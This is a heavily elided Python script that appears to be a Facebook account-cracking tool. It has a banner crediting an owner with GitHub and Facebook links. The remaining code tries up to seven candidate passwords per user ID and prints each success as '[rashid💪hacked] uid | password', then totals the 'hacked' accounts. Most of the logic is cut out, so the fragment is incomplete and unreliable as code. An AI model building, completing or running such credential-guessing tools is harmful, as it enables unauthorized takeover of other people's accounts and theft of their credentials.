...
\033[1;96m(~)\033[1;97m Owner : Rashid  Ali

\033[1;96m(~)\033[1;97m Github : https://github.com/rashidali27

\033[1;96m(~)\033[1;97m Fb     : https://www.facebook.com/Ali.Edit'X
...
def menu_select():
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;96m[rashid💪hacked] "+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;96m[rashid💪hacked] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;96m[rashid💪hacked] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;96m[rashid💪hacked] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;96m[rashid💪hacked] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;96m[rashid💪hacked] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;96m[rashid💪hacked] "+uid+" | "+pass7+"\x1b[1;0m")
	...
	print ("[!] Total rashid🌹cp/sher💪hacked : "+str(len(cps)) + "/"+str(len(oks)))
